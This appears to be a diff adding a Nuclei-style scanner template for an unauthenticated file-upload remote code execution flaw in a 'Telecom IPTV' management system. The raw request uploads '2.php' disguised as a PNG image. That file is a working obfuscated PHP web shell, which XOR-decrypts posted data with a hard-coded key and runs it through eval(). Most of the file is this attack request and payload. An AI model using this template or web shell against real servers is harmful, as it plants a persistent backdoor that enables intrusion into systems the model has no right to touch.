@@ -1,0 +1,80 @@
+id: Telecom-IPTV-RCE
+
+info:
+  name: Telecom IPTV RCE
+  author: momika233
+  severity: high
+  description: Telecom IPTV RCE
+  reference:
+    - https://www.github.com/momika233
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-22
+  tags: Telecom,IPTV,RCE
+
+requests:
+  - raw:
+      - |
+        POST /manager/teletext/material/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,
+        like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept:
+        text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
+        */*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en;q=0.6
+        Cookie: PHPSESSID=vsdl33qjn3fbslu7k3r99di5n3
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB33cDIYAxIrc9MsS
+        Content-Length: 943
+        ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+        Content-Disposition: form-data; name="fileToUpload"; filename="2.php"
+        Content-Type: image/png
+
+        <?php
+        @error_reporting(0);
+        function Decrypt($data)
+        {
+            $key="e45e329feb5d925b"; 
+            $bs="base64_"."decode";
+          $after=$bs($data."");
+          for($i=0;$i<strlen($after);$i++) {
+              $after[$i] = $after[$i]^$key[$i+1&15]; 
+            }
+            return $after;
+        }
+        $post=Decrypt(file_get_contents("php://input"));
+        eval($post);
+        ?>
+        ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+        Content-Disposition: form-data; name="type"
+        img
+        ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+        Content-Disposition: form-data; name="w"
+        1280
+        ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+        Content-Disposition: form-data; name="h"
+        720
+        ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+        Content-Disposition: form-data; name="userid"
+        1000301
+        ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+        Content-Disposition: form-data; name="appid"
+        5
+        ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+        Content-Disposition: form-data; name="uploadtime"
+        20230603_231117_168580
+        ------WebKitFormBoundaryB33cDIYAxIrc9MsS--
+    matchers:
+      - type: regex
+        regex:
+          - "success"
+        part: body
+
+      - type: status
+        status:
+          - 200
